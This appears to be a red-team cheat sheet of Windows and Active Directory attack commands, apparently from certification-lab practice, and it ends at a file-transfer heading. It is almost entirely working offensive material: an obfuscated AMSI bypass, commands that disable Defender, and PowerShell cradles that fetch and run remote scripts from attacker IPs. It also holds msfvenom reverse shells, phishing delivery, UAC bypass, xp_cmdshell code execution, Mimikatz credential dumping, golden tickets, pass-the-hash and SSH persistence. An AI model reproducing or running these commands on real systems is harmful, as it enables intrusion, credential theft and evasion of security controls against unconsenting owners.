## AMSI & AppLocker Bypasses 
#### AMSI Bypass
```
(new-object system.net.webclient).downloadstring('http://192.168.45.201/amsi.txt') | IEX
(new-object system.net.webclient).downloadstring('http://192.168.45.201/amsibypass.txt') | IEX

#patches AMSI protection in evil-winrm
    Bypass-4MSI

#.NET AMSI 
$ZQCUW = @"
using System;
using System.Runtime.InteropServices;
public class ZQCUW {
 [DllImport("kernel32")]
 public static extern IntPtr GetProcAddress(IntPtr hModule, string 
procName);
 [DllImport("kernel32")]
 public static extern IntPtr LoadLibrary(string name);
 [DllImport("kernel32")]
 public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr 
dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $ZQCUW
$BBWHVWQ = 
[ZQCUW]::LoadLibrary("$([SYstem.Net.wEBUtIlITy]::HTmldecoDE('&#97;&#109;&#115
;&#105;&#46;&#100;&#108;&#108;'))")
$XPYMWR = [ZQCUW]::GetProcAddress($BBWHVWQ, 
"$([systeM.neT.webUtility]::HtMldECoDE('&#65;&#109;&#115;&#105;&#83;&#99;&#97
;&#110;&#66;&#117;&#102;&#102;&#101;&#114;'))")
$p = 0
[ZQCUW]::VirtualProtect($XPYMWR, [uint32]5, 0x40, [ref]$p)
$TLML = "0xB8"
$PURX = "0x57"
$YNWL = "0x00"
$RTGX = "0x07"
$XVON = "0x80"
$WRUD = "0xC3"
$KTMJX = [Byte[]] ($TLML,$PURX,$YNWL,$RTGX,+$XVON,+$WRUD)
[System.Runtime.InteropServices.Marshal]::Copy($KTMJX, 0, $XPYMWR, 6)
```



#### Disable Defender
```
#PowerShell
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableRealtimeMonitoring $true

#CMD one-liner
Powershell -WindowStyle Hidden Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend;

#from CME  
sudo crackmapexec smb 172.16.1.201 -u joe -p 'Dev0ftheyear!' -x 'Powershell -WindowStyle Hidden Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend;'

#Meterpreter
run post/windows/manage/killav
```


#### AppLocker PowerShell Bypass 
```
#Check for Constrained Language Mode
$ExecutionCOntext.SessionState.LanguageMode
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections 

#CLM bypass
curl http://192.168.45.201/PSbypassCLM2.exe -o bypass.exe
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Windows\Tasks\bypass.exe
C:\AD\Tools\InviShell\InviShell\RunWithRegistryNonAdmin.bat
```

<br> 
<br>
<br>


## Enumeration 
#### PowerView 
```
Get-Domain
Get-DomainSID
Get-DomainController
Get-DomainTrust
Get-DomainTrustmapping
Get-DomainTrust | ?{$_.TrustAttributes -eq "FILTER_SIDS"}
Get-Forest
Get-ForestDomain -Verbose
Get-ForestDomain | %{Get-DomainTrust -Domain $_.Name} | ?{$_.TrustAttributes -eq "FILTER_SIDS"}

Get-DomainUser
Get-DomainUser | select cn,samaccountname 
Get-DomainUser -Identity "ted"
Get-DomainUser -Identity harry.jones -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
Get-DomainUser * |select samaccountname,description | ?{$_.Description -ne $null}

Get-DomainGroup | select name 
Get-DomainGroup -UserName "ella"
Get-DomainGroup -Identity "Domain Admins" -Recurse
Get-DomainGroupMember -Identity "Domain Admins" | select MemberName 
Get-DomainManagedSecurityGroup
Find-ManagedSecurityGroups | select GroupName
Find-ForeignGroup
Get-DomainForeignGroupMember -Domain comply.com
Convert-SidToName S-1-5-21-888139820-103978830-333442103-1602
"S-1-5-21-888139820-103978830-333442103-1602" | ConvertFrom-SID

Get-DomainComputer | select -ExpandProperty dnshostname, useraccountcontrol

Get-DomainComputer -Unconstrained
Get-DomainUser -TrustedToAuth

Get-DomainGPO -ComputerIdentity WS01 | select displayname

Test-AdminAccess -ComputerName SQL01
```

#### BloodHound
```
SharpHound.exe -c all --domain core-jijistudios.com --zipfilename out.zip

.\SharpHound.ps1 
Invoke-BloodHound -CollectionMethod All -Verbose

sudo bloodhound-python -dc DC04.tricky.com -ns 172.16.170.150 --dns-tcp -d tricky.com -c All -u sqlsvc@tricky.com -p '4dfgdfFFF542' --zip 
sudo bloodhound-python -dc dc01.jijistudio.com -ns 172.16.116.100 -d jijistudio.com -u 'web05' --hashes 'aad3b435b51404eeaad3b435b51404ee:e77541ac65a3fc493c3180041095d2dc' -c All --zip
```
<br>
<br>
<br>

## Payloads & Footholds 
#### VBA Payload 
```
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.45.201 LPORT=443 EXITFUNC=thread -f vbapplication
	set EXITFUNC thread
```

#### Phishing + DotNetToJScript
```
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.45.201 lport=443 -f csharp
DotNetToJscript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o test.js

sudo swaks --to will@tricky.com --server mail01.tricky.com --body http://192.168.45.201/download.hta
```

#### SQLmap (OS-Shell) 
```
sqlmap -r post.req -p artist --os-shell
sqlmap -r post.req -p artist --os-cmd 'echo IEX (New-Object Net.WebClient).DownloadString("http://192.168.45.201/run.ps1") | powershell -noprofile'
```
<br>
<br>
<br>

## Privilege Escalation
#### Service Abuse
```
.\PowerUp.ps1
Invoke-AllChecks
Invoke-ServiceAbuse -Name 'AbyssWebServer' -Username 'dcorp\student551' -Verbose
net localgroup administrators (check your user was added)
```

#### UAC Bypass
Option 1: uacbypass.ps1

https://github.com/Octoberfest7/OSEP-Tools/blob/main/uacbypass.ps1

Option 2: Fodhelper.exe with PS shellcode runner

```
use exploit/multi/handler
set EnableStageEncoding true
set StageEncoder x64/zutto_dekir
run

New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value "powershell.exe (New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/run.txt') | IEX" -Force
New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force    
C:\Windows\System32\fodhelper.exe
```

#### LAPS 
```
IF we can read LAPS password we can escalated to local admin

Get-DomainObject -Identity client -Properties ms-Mcs-AdmPwd
Get-DomainObject -Identity web05 -Properties ms-Mcs-AdmPwd

run post/windows/gather/credentials/enum_laps 
```

<br>
<br>
<br>

## Active Directory Attacks 

#### Kerberoasting 
```
sudo /usr/bin/impacket-GetUserSPNs painters.htb/riley -request
sudo hashcat -m 13100 web_svc.hash /opt/wordlists/rockyou.txt
```
#### Unconstrained Delegation 
```
Rubeus.exe monitor /interval:1 /nowrap
1. coerce auth w/ SpoolSample
	SpoolSample.exe DC03$ WEB05$
2. coerce auth w/ dementor.py 
	sudo python3 dementor.py -d infinity.com -u WEB05$ --ntlm 'WEB05 machine hash' web05.infinity.com 		dc03.infinity.com
3. coerce auth w/ MS-RPRN
	MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' # dump krbtgt 
Invoke-Mimikatz -Command '"lsadump::dcsync /all"' # complete dcsync
```
#### Constrained Delegation - Linux
```
sudo /opt/impacket/examples/findDelegation.py painters.htb/blake
sudo getST.py -spn CIFS/dc.painters.htb -impersonate Administrator -dc-ip 192.168.110.55 'painters.htb/blakeLPassword123'
export KRB5CCNAME=./Administrator.ccache
sudo crackmapexec smb 192.1698.110.55 -d painters.htb -u administrator --use-kcache
sudo crackmapexec smb 192.1698.110.55 -d painters.htb -u administrator --use-kcache --ntds
psexec.py -k -no-pass INLANEFREIGHT.LOCAL/administrator@DC01 -debug
```
#### Constrained Delegation - Windows
```
#User - Constrained Delegation 
Get-DomainUser -TrustedToAuth
Rubeus.exe s4u /user:websvc /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 /impersonateuser:Administrator /msdsspn:CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL /ptt
dir \\dcorp-mssql.dollarcorp.moneycorp.local\c$
psexec.exe \\dccorp cmd.exe

#User - Constrained Delegation
Rubeus.exe asktgt /user:iissvc /domain:corp.com /rc4:<hash_above>
Rubeus.exe s4u /ticket:do..... /impersonateuser:administrator /msdsspn:mssqlsvc/cdc01.corp.com:1433 /ptt

#Computer - Constrained Delegation (TIME or LDAP)
Get-DomainComputer -TrustedToAuth
.\mimikatz.exe privilege::debug sekurlsa::msv exit
Rubeus.exe s4u /user:dcorp-adminsrv$ /aes256:e9513a0ac270264bb12fb3b3ff37d7244877d269a97c7b3ebc3f6f78c382eb51 /impersonateuser:Administrator /msdsspn:time/dcorp-dc.dollarcorp.moneycorp.LOCAL /altservice:ldap /ptt
SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"

#Computer - Constrained Delegation (WWW or HTTP)
.\mimikatz.exe privilege::debug sekurlsa::msv exit
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:www/WS01.inlanefreight.local /altservice:HTTP /user:DMZ01$ /rc4:ff955e93a130f5bb1a6565f32b7dc127 /ptt
Enter-PSSession ws01.inlanefreight.local
winrs -r:dcorp-mgmt cmd
```
#### RBCD - Linux
```
#Enumerate
Look for Write permissions for user, group or computer that has been compromised (GenericWrite, GenericAll, WriteProperty, WriteDACL, or AllowedToAct privileges on a computer object)

Find-InterestingDomainACL | ?{$_.identityreferencename -match 'ciadmin'}
Get-DomainComputer ws01 | Select-Object -Property name, msds-allowedtoactonbehalfofotheridentity
Get-DomainComputer | Where-Object {$_."msDS-AllowedToActOnBehalfOfOtherIdentity" -ne $null} 
.\SearchRBCD.ps1

#RBCD Attack (User)
sudo /opt/impacket/examples/addcomputer.py -computer-name 'ATTACK$' -computer-pass Attack123 -dc-ip 172.16.170.165 complyedge.com/jim -hashes 'NT:LM'
sudo /opt/impacket/examples/rbcd.py -dc-ip 172.16.170.165 -delegate-to 'JUMP09$' -delegate-from 'ATTACK$' 'ops.comply.com/FILE06$' -hashes 'hash'
sudo /opt/impacket/examples/getST.py CIFS/JUMP09.ops.comply.com -impersonate Administrator dc-ip 172.16.170.165 ops.comply.com/ATTACK$:Attack123
export KRB5CCNAME= 
sudo impacket-psexec -dc-ip 172.16.170.165 -k -no-pass administrator@JUMP09.ops.comply.com

#RBCD Attack (Computer$)
addcomputer.py -computer-name 'ATTACK$' -comptuer-pass 'Attack123' -dc-ip 172.16.170.165 'crude.corp/OIL-WK01$' -hashes 'machine account hash of OIL-WK01$'
rbcd.py -dc-ip 172.16.170.165 -t OIL-MGMT$ -f ATTACK$ -u 'crude.corp/OIL-WK01$' -hashes 'machine account hash of OIL-WK01$'
getSTy.py -spn CIFS/OIL-MGMT$ -impersonate administrator -dc-ip 172.16.170.165 'crude.corp/ATTACK$:Attack1243'
export KRB5CCNAME=
impacket-secretsdump -k -no-pass internal.zsm.local/administrator@ZPH-SVRDC01.zsm.local
impacket-secretsdump -k -target-ip 172.16.2.145 oilmgmt.crude.corp 
```

#### MSSQL Linked Servers 
```
#Enumerate
SELECT srvname, isremote FROM sysservers go
.\PowerUpSQL.ps1
Get-SQLServerInfo -Verbose
Get-SQLInstanceLocal 
Get-SQLServerLinkCrawl -Instance sql11 -Verbose

#PrivEsc/Impersonation
EXECUTE AS LOGIN = 'sa';
EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

#RCE on 1st Link
EXECUTE AS LOGIN = 'sa';
EXEC sp_serveroption 'SQL03', 'rpc out', 'true';
EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT [SQL27] 
EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [SQL27] 
EXEC ('xp_cmdshell ''powershell -enc SQBFAFgAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABzAHkAcwB0AGUAbQAuAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4ANAA1AC4AMgAwADEALwByAHUAbgAuAHAAcwAxACcAKQApAA==''') AT [SQL27]
pwsh 
$text = "IEX((new-object system.net.webclient).downloadstring('http://192.168.45.201/run.ps1'))";$bytes = [System.Text.Encoding]::Unicode.GetBytes($text);$EncodedText = [Convert]::ToBase64String($bytes);$EncodedText

#Other RCE download cradles
EXEC xp_cmdshell 'echo IEX (New-Object Net.WebClient).DownloadString("http://10.10.14.7/script.ps1") | powershell -noprofile'

#RCE 2nd Linked Server
EXEC ('EXECUTE AS LOGIN = ''sa'';EXEC sp_configure ''show advanced options'', 1;reconfigure; EXEC sp_configure ''xp_cmdshell'',1;reconfigure') AT SQL53
EXEC ('EXECUTE AS LOGIN = ''sa''; EXEC xp_cmdshell ''powershell -enc SQBFAFgAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABzAHkAcwB0AGUAbQAuAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4ANAA1AC4AMgAwADEALwByAHUAbgAuAHAAcwAxACcAKQApAA==''') AT SQL53

#RCE from PowerUpSQL
Get-SQLQuery -Instance "CYWEBDW\SQLEXPRESS,1433" -Query 'SELECT * FROM OPENQUERY("m3sqlw.m3c.local", ''SELECT * FROM sys.configurations WHERE name = ''''xp_cmdshell'''''');'
Get-SQLQuery -Instance "CYWEBDW\SQLEXPRESS,1433" -Query 'EXEC(''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT [m3sqlw.m3c.local]'
Get-SQLQuery -Instance "CYWEBDW\SQLEXPRESS,1433" -Query 'EXEC(''sp_configure ''''xp_cmdshell'''', 1; reconfigure;'') AT [m3sqlw.m3c.local]'
Get-SQLServerLinkCrawl -Instance CYWEBDW\SQLEXPRESS -Query "exec master..xp_cmdshell 'whoami'"
Get-SQLServerLinkCrawl -Instance CYWEBDW\SQLEXPRESS -Query "exec master..xp_cmdshell 'powershell -e JABzAD0AJwAxADAALgAxADAALgAxADUALgA0ADEAOgA4ADAAOAAwACcAOwAkAGkAPQAnADgAZgAwADAAZQA3ADgANwAtAGMAYwAwADIAMgAzADkAMgAtAGUAOQBjAGYAZgBlADAAMAAnADsAJABwAD0AJwBoAHQAdABwADoALwAvACcAOwAkAHYAPQBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACAALQBVAHIAaQAgACQAcAAkAHMALwA4AGYAMAAwAGUANwA4ADcAIAAtAEgAZQBhAGQAZQByAHMAIABAAHsAIgBYAC0AZQA5AGIANgAtAGUAMwBhADQAIgA9ACQAaQB9ADsAdwBoAGkAbABlACAAKAAkAHQAcgB1AGUAKQB7ACQAYwA9ACgASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwAgAC0AVQByAGkAIAAkAHAAJABzAC8AYwBjADAAMgAyADMAOQAyACAALQBIAGUAYQBkAGUAcgBzACAAQAB7ACIAWAAtAGUAOQBiADYALQBlADMAYQA0ACIAPQAkAGkAfQApAC4AQwBvAG4AdABlAG4AdAA7AGkAZgAgACgAJABjACAALQBuAGUAIAAnAE4AbwBuAGUAJwApACAAewAkAHIAPQBpAGUAeAAgACQAYwAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAUwB0AG8AcAAgAC0ARQByAHIAbwByAFYAYQByAGkAYQBiAGwAZQAgAGUAOwAkAHIAPQBPAHUAdAAtAFMAdAByAGkAbgBnACAALQBJAG4AcAB1AHQATwBiAGoAZQBjAHQAIAAkAHIAOwAkAHQAPQBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcgBpACAAJABwACQAcwAvAGUAOQBjAGYAZgBlADAAMAAgAC0ATQBlAHQAaABvAGQAIABQAE8AUwBUACAALQBIAGUAYQBkAGUAcgBzACAAQAB7ACIAWAAtAGUAOQBiADYALQBlADMAYQA0ACIAPQAkAGkAfQAgAC0AQgBvAGQAeQAgACgAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AEIAeQB0AGUAcwAoACQAZQArACQAcgApACAALQBqAG8AaQBuACAAJwAgACcAKQB9ACAAcwBsAGUAZQBwACAAMAAuADgAfQA='"

Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://172.16.100.1/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://172.16.100.1/amsibypass.txt);iex (iwr -UseBasicParsing http://172.16.100.1/Invoke-PowerShellTcpEx.ps1)"''' -QueryTarget eu-sql

#UNC Path Injection - NTLM Hash Relay 
sudo proxychains4 impacket-ntlmrelayx --no-http-server -smb2support -t 172.16.154.152 -c 'powershell -enc SQBFAFgAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABzAHkAcwB0AGUAbQAuAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4ANAA1AC4AMgAzADQALwByAHUAbgAuAHAAcwAxACcAKQApAA=='
EXEC master..xp_dirtree "\192.168.49.67\share";
```

#### ForceChangePassword
```
Set-DomainUserPassword -Identity black -AccountPassword (ConvertTo-String 'Passw0rd' -AsPlainText -Force) -Verbose

net rpc passowrd "Jamie@zsm.local" "NewPass123!" -u "zsm.local/Marcus"%"!QAZ2wsx" -S 192.168.210.10 
```

#### Add Group Member
```
PowerView.ps1
$SecPassword = ConvertTo-SecureString '4dfgdfFFF542' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TRICKY.com\sqlsvc', $SecPassword)
Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity "SQL Admins" -TargetIdentity "MAILADMINS" -Rights All
Add-DomainGroupMember -Identity 'MAILADMINS' -Members 'SQLsvc' -Credential $Cred
Get-DomainGroupMember -Identity 'MAILADMINS'
sudo proxychains4 /opt/impacket/examples/secretsdump.py -dc-ip 172.16.154.150 TRICKY.com/sqlsvc:4dfgdfFFF542@172.16.154.150
```

#### AddKeyCredentialLink 
```
certipy shadow add -username marcus@zsm.local -p '!QAZ2wsx' -account ZPH-SVRMGMT1
certipy auth -pfx ZPH-SVRMGMT1.pfx -user 'ZPH-SVRMGMT1$' -domain 'zsm.local' -dc-ip 192.168.210.10
net rpc group addmem "GENERAL MANAGEMENT" "marcus" -U "zsm.local"/"zph-svrmgmt1$"%"89d0b56874f61ad38bad336a77b8ef2f" --pw-nt-hash -S "ZPH-SVRDC01.zsm.local"
```

#### Golden Ticket - Linux
```
lookupsid.py inlanefreight.local/pixis@dc01.inlanefreight.local -domain-sids
ticketer.py -nthash 810d754e118439bab1e1d13216150299 -domain-sid S-1-5-21-2974783224-3764228556-2640795941 -domain inlanefreight.local Administrator
export KRB5CCNAME=./Administrator.ccache
psexec.py -k -no-pass dc01.inlanefreight.local
```

#### Golden Ticket - Windows
```
#parent to child domain 
DC01.final.com -> Dc02.dev.final.com
Get-DomainSID
Invoke-Mimikatz -Command '"kerberos::golden /user:administrator /domain:final.com /sid:S-1-5-21-3097757723-3922880870-3169422460 /krbtgt:405854caaf49b41e0e585369a001f114 /id:500 /ptt"'
.\PsExec.exe \\dc02 cmd

#child to parent domain 
CDC07.ops.comply -> RDC02.comply.com (extra SID)
Invoke-Mimikatz -Command '"kerberos::golden /user:nina /domain:ops.comply.com /sid:S-1-5-21-2032401531-514583578-4118054891 /krbtgt:7c7865e6e30e54e8845aad091b0ff447 /sids:S-1-5-21-1135011135-3178090508-3151492220-519 /ptt"'
\\PsExec.exe \\rdc02 cmd 

#child to parent domain (Trust Keys)
dollarcorp.local.moneycorp.local -> moneycorp.local
Invoke-Mimikatz -Command '"lsadump::trust /patch "'
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /rc4:5542260d525db0dab8d2d1089511e433 /service:krbtgt /target:moneycorp.local /ticket:trust_tkt.kirbi
Rubeus.exe asktgs /ticket:trust_tkt.kirbi /service:cifs/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt
```

<br>
<br>
<br>

## Post-Exploitation 
#### SSH persistence  
```
cd /root
mkdir .ssh 
cd .ssh 
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDCYAcnDL/a0CEBRiUHdhpLZQv6BLU1l5yB2wkgIBjJbZoWrXlALu3g8adnZkLl55A6/ph68JGQBqDWENBm6FBpaxIInbWPOPPFnUOYP3CQuksPO0785lGecR/4IoWvdTiiu6M5DfAzc7zzlIzNrnIV50zxa48f5b7dTyqjfHjP4h2jwbkA/NwA3KXSw9/9x5chiwVmfHqTQHVmYz8wDwVv4NhJQm/V7SHKKekMuhX+Ei4+pgwCRbr1h2RbFcnol3zZkb0NOBMTrJRhirXJqM6Fqj/I0T/EEv/O3rf4cW6k6Lq/+b9rrOFwrwpc7ElXSxJaKKlpbzV1mW1BtR7yvFVAd5tGdKmRsEAAEvPvlxhit1+EQuJChAt7TNQTEm8uqXjkJ8+TXjHFkVrOz1Z5BAuwBJEB8Tgd3zxaapkenc/APrHbfwzsJOZOqLVsrVEhgocaV7wu3QKwj8X8BtHR89D5PwKTyVHSHawyFdMq7UsM2UAgHfmyQN+Z/ZcDIOMppqc= kali@kali" >> /root/.ssh/authorized_keys
ssh root@192.168.154.164
```
#### SSH keys 
```
#using SSH keys 
find /home/ -name "id_rsa"
copy key to kali via scp
sudo chmod 600 id_rsa 
sudo ssh -i id_rsa final\\tommy@172.16.154.184

#passphrase
ssh2john user.key > user.hash
john user.hash --wordlist=/opt/wordlists/rockyou.txt
```

#### Dumping Hashes
```
sudo /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support smb . -username kali -password kali
net use \\192.168.49.51\smb /user:kali kali 
reg.exe save hklm\system \\192.168.49.51\smb\SYSTEM
reg.exe save hklm\sam \\192.168.49.51\smb\SAM
reg.exe save hklm\security \\192.168.49.51\smb\SECURITY
sudo /opt/impacket/examples/secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL

#Mimikatz
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"' 
Invoke-Mimikatz -Command '"lsadump::secrets"'
Invoke-Mimikatz -Command '"lsadump::sam"'
Invoke-Mimikatz -Command '"lsadump::lsa"'
Invoke-Mimikatz -Command '"token::elevate" "!+" "!processtoken" "sekurlsa::logonpasswords"'

#Disabling LSA protection 
!+
!processprotect /process:lsass.exe /remove
sekurlsa::logonpasswords 

#SafteyKatz 
SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"

#DCSync 
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:infinity.com /user:krbtgt

#secretsdump.py
sudo /usr/share/doc/python3-impacket/examples/secretsdump.py medtech/joe:Flowers1@172.16.188.11

#NTDS.dit
sudo crackmapexec smb dc03.infinity.com -u pete -H 'hash' --ntds
sudo crackmapexec smb 192.168.210.16 -u ZPH-SVRCDC01$ -H 'd47a6d90e1c5adf4200227514e393948' --ntds
sudo /usr/share/doc/python3-impacket/examples/secretsdump.py -hashes ':5bdd6a33efe43f0dc7e3b2435579aa53' administrator@192.168.110.55 
```

<br>
<br>
<br>


## Lateral Movement - Windows 

#### RDP 
```
#Disable Restricted Admin
1. From CMD 
reg.exe add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
2. From CME
sudo crackmapexec smb 172.16.170.166 -d complyedge.com -u jim -H 'e48c13cefd8f9456d79cd49651c134e8' -x 'reg.exe add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f' --exec-method smbexec
3. From PS
Remove-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name 
DisableRestrictedAdmin

#XfreeRDP/Rdesktop
rdesktop 192.168.154.122 -u administrator -p 'password123'
sudo xfreerdp /v:192.168.154.121 /u:administrator /pth:21f3dd003492ff0eb20db3710e1cc02d /size:1700x1160
sudo  xfreerdp /u:admin /pth:2892D26CDF84D7A70E2EB3B9F05C425E /v:192.168.120.6 
/cert-ignore

#Enable-PSSession
Invoke-Mimikatz -Command '"sekurlsa::pth /user:admin /domain:corp1 
/ntlm:2892D26CDF84D7A70E2EB3B9F05C425E /run:powershell'"
Enter-PSSession -Computer appsrv01
New-ItemProperty -Path 
"HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -Value 0
```

#### PsExec 
```
sudo impacket-psexec administrator@172.16.170.194 -hashes ':f99529e42ee77dc4704c568ba9320a34'
sudo impacket-psexec student551:'D7Ys4CAcQBTWvteG'@172.16.4.101
\\PsExec.exe \\rdc02 cmd
```

#### Wmiexec
```
sudo impacket-wmiexec student551:'D7Ys4CAcQBTWvteG'@172.16.4.101
sudo impacket-wmiexec administrator@172.16.1.1 -hashes ':71d04f9d50ceb1f64de7a09f23e6dc4c'
```

#### Evil-Winrm 
```
sudo evil-winrm -i 10.10.15.20 -u joe -p password
sudo evil-winrm -i 10.10.15.20 -u melissa -H 251e366fdd64eff18be0824ec7c6833c
sudo proxychains4 evil-winrm -i 192.168.154.169 -u 'OPS.COMPLY.COM\pete' -p '0998ASDaas2'
```

<br>
<br>
<br>

## Lateral Movement - Linux 

#### Ansible Vault
```
python3 /usr/share/john/ansible2john.py ansible.yml > ansible.hash
mousepad ansible.hash & remove first line
hashcat ansible.hash --force --hash-type=16900 /opt/wordlists/rockyou.txt
add original vault key to file -> pw.txt
cat pw.txt | ansible-vault decrypt
	enter passowrd:
```

#### Artifactory 
```
#Artifactory Backups 
/<ARTIFACTORY FOLDER>/var/backup/access
/opt/jfrog/artifactory/var/backup/access
cat access.backup.20200730120454.json
sudo john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

#Compromising Artifactory Database
copy database to temp location
mkdir /tmp/hackeddb
sudo cp -r /opt/jfrog/artifactory/var/data/access/derby 
/tmp/hackeddb
sudo chmod 755 /tmp/hackeddb/derby
sudo rm /tmp/hackeddb/derby/*.lck

#connect to DB & access users/passwords
sudo /opt/jfrog/artifactory/app/third-party/java/bin/java -jar 
/opt/derby/db-derby-10.15.1.3-bin/lib/derbyrun.jar ij
connect 'jdbc:derby:/tmp/hackeddb/derby';
select * from access_users;
sudo john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

#### Kerberos on Linux 
On a linux target that can authenticate to AD via kerberos we can perform any of the following
```
#SSH w/ AD credentials 
ssh administrator@corp1.com@linuxvictim

#Enumerating SPNs via Kerberos
ldapsearch -Y GSSAPI -H ldap://dc01.corp1.com -
D "Administrator@CORP1.COM" -W -b "dc=corp1,dc=com" "servicePrincipalName=*" 
servicePrincipalName

#find users ccache file in environment variable 
env | grep KRB5CCNAME - find credentials 

#Request a TGT & use it to request service ticket 
kinit (enter password will give us TGT for user)
klist
kvno MSSQLSvc/DC01.corp1.com:1433
klist

OR

#copy ccache file & use it to request service tickets
ls -al /tmp/krb5cc_*
sudo cp /tmp/krb5cc_607000500_3aeIA5 /tmp/krb5cc_minenow
sudo chown offsec:offsec /tmp/krb5cc_minenow
export KRB5CCNAME=/tmp/krb5cc_minenow
kvno MSSQLSvc/DC01.corp1.com:1433

#renew expired TGT
kinit -R 
```

Stealing Keytab Files
```
#load keytab file & use it 
kinit administrator@CORP1.COM -k -t /tmp/administrator.keytab  
klist
smbclient -k -U "CORP1.COM\administrator" //DC01.CORP1.COM/C$
```

Kerberos with Impacket - Stolen Credential Cache files in linux 
```
#copy to kali & export 
sudo scp -i ~/.ssh/id_rsa root@192.168.154.164:/tmp/krb5cc_75401103_YdtzIi . 
export KRB5CCNAME=/tmp/krb5cc_minenow

#enumerate domain users & SPNs 
sudo python3 /usr/share/doc/python3-
impacket/examples/GetADUsers.py -all -k -no-pass -dc-ip 192.168.120.5 
CORP1.COM/Administrator

sudo python3 /usr/share/doc/python3-
impacket/examples/GetUserSPNs.py -k -no-pass -dc-ip 192.168.120.5 
CORP1.COM/Administrator

#PsExec to move laterally 
python3 /usr/share/doc/python3-impacket/examples/psexec.py 
Administrator@DC01.CORP1.COM -k -no-pass

sudo impacket-psexec -k -no-pass -dc-ip 172.16.154.168 complyedge.com/pete@complyedge.com@dmzdc01.complyedge.com
sudo python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -k -no-pass -dc-ip 172.16.154.168 COMPLYEDGE.COM/pete@complyedge.com@dmzdc01.complyedge.com
```

<br>
<br>
<br>


## Other 

#### Screenshots Flag 
```
Windows:
hostname && whoami && type local.txt && ipconfig /all 
hostname && whoami && type proof.txt && ipconfig /all
```

#### File Transfer & Download
```
#file download
